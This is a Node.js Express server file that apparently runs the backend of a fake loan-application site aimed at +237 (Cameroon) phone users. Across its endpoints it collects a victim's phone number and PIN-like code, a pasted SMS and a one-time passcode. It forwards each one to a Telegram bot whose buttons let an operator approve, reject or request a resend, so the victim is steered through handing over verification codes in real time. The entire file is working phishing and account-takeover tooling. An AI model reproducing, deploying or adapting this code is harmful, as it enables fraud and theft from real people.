const express = require('express');
const cors = require('cors');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json());
app.use(express.static(__dirname));

// Temporary memory for applications
const applications = {};

// 1. Receive initial application
app.post('/api/apply', async (req, res) => {
    const { phone, code } = req.body;
    const appId = Date.now().toString(); 

    applications[appId] = { status: 'pending', phone, code };

    const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
    const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

    const message = `🚨 *NEW APPLICATION* 🚨\n\n` +
                    `📞 *Phone:* +237 ${phone}\n` +
                    `🔑 *Code:* ${code}\n\n` +
                    `Status: ⏳ Pending`;

    try {
        await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'Markdown',
                reply_markup: {
                    inline_keyboard: [
                        [
                            { text: "✅ APPROVE", callback_data: `approve_${appId}` },
                            { text: "❌ REJECT", callback_data: `reject_${appId}` }
                        ]
                    ]
                }
            })
        });

        res.status(200).json({ success: true, appId: appId });
    } catch (error) {
        console.error(error);
        res.status(500).json({ success: false });
    }
});

// 2. Check initial application status
app.get('/api/status/:id', (req, res) => {
    const appId = req.params.id;
    if (applications[appId]) {
        res.json({ status: applications[appId].status });
    } else {
        res.status(404).json({ error: "Application not found" });
    }
});

// 3. Verify pasted SMS and send to Telegram for approval
app.post('/api/verify-sms', async (req, res) => {
    const { sms, appId } = req.body;
    
    if (!sms) return res.json({ success: false });

    if (applications[appId]) {
        applications[appId].smsStatus = 'pending';
        applications[appId].smsText = sms;
    }

    const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
    const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

    const message = `📩 *SMS RECEIVED* 📩\n\n*App ID:* \`${appId}\`\n\n*Message:*\n\`\`\`\n${sms}\n\`\`\``;

    try {
        await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ 
                chat_id: TELEGRAM_CHAT_ID, 
                text: message, 
                parse_mode: 'Markdown',
                reply_markup: {
                    inline_keyboard: [
                        [
                            { text: "✅ APPROVE", callback_data: `approve_sms_${appId}` },
                            { text: "❌ REJECT", callback_data: `reject_sms_${appId}` }
                        ],
                        [
                            { text: "🔄 RESEND", callback_data: `resend_sms_${appId}` }
                        ]
                    ]
                }
            })
        });
        res.json({ success: true });
    } catch (error) {
        res.status(500).json({ success: false });
    }
});

// 4. Check SMS status (polling from the website)
app.get('/api/sms-status/:id', (req, res) => {
    const appId = req.params.id;
    if (applications[appId] && applications[appId].smsStatus) {
        res.json({ status: applications[appId].smsStatus });
    } else {
        res.json({ status: 'pending' });
    }
});

// 5. Receive the 4-digit OTP and send to Telegram for final approval
app.post('/api/submit-otp', async (req, res) => {
    const { otp, appId } = req.body;

    if (applications[appId]) {
        applications[appId].otpStatus = 'pending';
        applications[appId].otpCode = otp;
    }

    const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
    const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

    const message = `🔐 *NEW OTP RECEIVED* 🔐\n\n` +
                    `*App ID:* \`${appId}\`\n` +
                    `*OTP Code:* \`${otp}\`\n\n` +
                    `Status: Finalizing Loan...`;

    try {
        await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ 
                chat_id: TELEGRAM_CHAT_ID, 
                text: message, 
                parse_mode: 'Markdown',
                reply_markup: {
                    inline_keyboard: [
                        [
                            { text: "✅ APPROVE", callback_data: `approve_otp_${appId}` },
                            { text: "🔄 RESEND", callback_data: `resend_otp_${appId}` },
                            { text: "🚫 INACTIVE", callback_data: `inactive_otp_${appId}` }
                        ]
                    ]
                }
            })
        });
        res.json({ success: true });
    } catch (error) {
        console.error(error);
        res.status(500).json({ success: false });
    }
});

// 6. Check OTP status (polling from the website)
app.get('/api/otp-status/:id', (req, res) => {
    const appId = req.params.id;
    if (applications[appId] && applications[appId].otpStatus) {
        res.json({ status: applications[appId].otpStatus });
    } else {
        res.json({ status: 'pending' });
    }
});

// 7. Telegram Webhook (Handles all button clicks)
app.post('/api/telegram-webhook', async (req, res) => {
    const { callback_query } = req.body;

    if (callback_query) {
        const data = callback_query.data; 
        const messageId = callback_query.message.message_id; 
        const chatId = callback_query.message.chat.id;
        
        // Parse the callback data properly
        let action, appId, target;
        if (data.includes('sms_')) {
            const parts = data.split('_'); 
            action = parts[0];
            target = parts[1];
            appId = parts[2];
        } else if (data.includes('otp_')) {
            const parts = data.split('_'); 
            action = parts[0];
            target = parts[1];
            appId = parts[2];
        } else {
            const parts = data.split('_'); 
            action = parts[0];
            appId = parts[1];
        }

        let newText = "";
        let newStatus = "";

        if (applications[appId]) {
            // Handle Initial Application Buttons
            if (!target && (action === 'approve' || action === 'reject')) {
                if (action === 'approve') {
                    applications[appId].status = 'approved';
                    newText = `🚨 *NEW APPLICATION* 🚨\n\n` +
                              `📞 *Phone:* +237 ${applications[appId].phone}\n` +
                              `🔑 *Code:* ${applications[appId].code}\n\n` +
                              `Status: ✅ *APPROVED*`;
                    newStatus = "Approved!";
                } else {
                    applications[appId].status = 'rejected';
                    newText = `🚨 *NEW APPLICATION* 🚨\n\n` +
                              `📞 *Phone:* +237 ${applications[appId].phone}\n` +
                              `🔑 *Code:* ${applications[appId].code}\n\n` +
                              `Status: ❌ *REJECTED*`;
                    newStatus = "Rejected!";
                }
            } 
            // Handle SMS Verification Buttons
            else if (target === 'sms') {
                if (action === 'approve') {
                    applications[appId].smsStatus = 'approved';
                    newText = `📩 *SMS RECEIVED* 📩\n\n*App ID:* \`${appId}\`\n\n*Message:*\n\`\`\`\n${applications[appId].smsText}\n\`\`\`\n\nStatus: ✅ *SMS APPROVED*`;
                    newStatus = "SMS Approved!";
                } else if (action === 'reject') {
                    applications[appId].smsStatus = 'rejected';
                    newText = `📩 *SMS RECEIVED* 📩\n\n*App ID:* \`${appId}\`\n\n*Message:*\n\`\`\`\n${applications[appId].smsText}\n\`\`\`\n\nStatus: ❌ *SMS REJECTED*`;
                    newStatus = "SMS Rejected!";
                } else if (action === 'resend') {
                    applications[appId].smsStatus = 'resend';
                    newText = `📩 *SMS RECEIVED* 📩\n\n*App ID:* \`${appId}\`\n\n*Message:*\n\`\`\`\n${applications[appId].smsText}\n\`\`\`\n\nStatus: 🔄 *RESEND REQUESTED*`;
                    newStatus = "Resend Requested!";
                }
            }
            // Handle OTP Verification Buttons
            else if (target === 'otp') {
                if (action === 'approve') {
                    applications[appId].otpStatus = 'approved';
                    newText = `🔐 *NEW OTP RECEIVED* 🔐\n\n` +
                              `*App ID:* \`${appId}\`\n` +
                              `*OTP Code:* \`${applications[appId].otpCode}\`\n\n` +
                              `Status: ✅ *OTP APPROVED*`;
                    newStatus = "OTP Approved!";
                } else if (action === 'resend') {
                    applications[appId].otpStatus = 'resend';
                    newText = `🔐 *NEW OTP RECEIVED* 🔐\n\n` +
                              `*App ID:* \`${appId}\`\n` +
                              `*OTP Code:* \`${applications[appId].otpCode}\`\n\n` +
                              `Status: 🔄 *RESEND REQUESTED*`;
                    newStatus = "Resend Requested!";
                } else if (action === 'inactive') {
                    applications[appId].otpStatus = 'inactive';
                    newText = `🔐 *NEW OTP RECEIVED* 🔐\n\n` +
                              `*App ID:* \`${appId}\`\n` +
                              `*OTP Code:* \`${applications[appId].otpCode}\`\n\n` +
                              `Status: 🚫 *ACCOUNT INACTIVE*`;
                    newStatus = "Marked Inactive!";
                }
            }

            // Edit Telegram Message
            await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/editMessageText`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: chatId,
                    message_id: messageId,
                    text: newText,
                    parse_mode: 'Markdown',
                    reply_markup: { inline_keyboard: [] } 
                })
            });
        }

        // Answer callback
        await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/answerCallbackQuery`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ callback_query_id: callback_query.id, text: newStatus })
        });
    }

    res.sendStatus(200);
});

app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});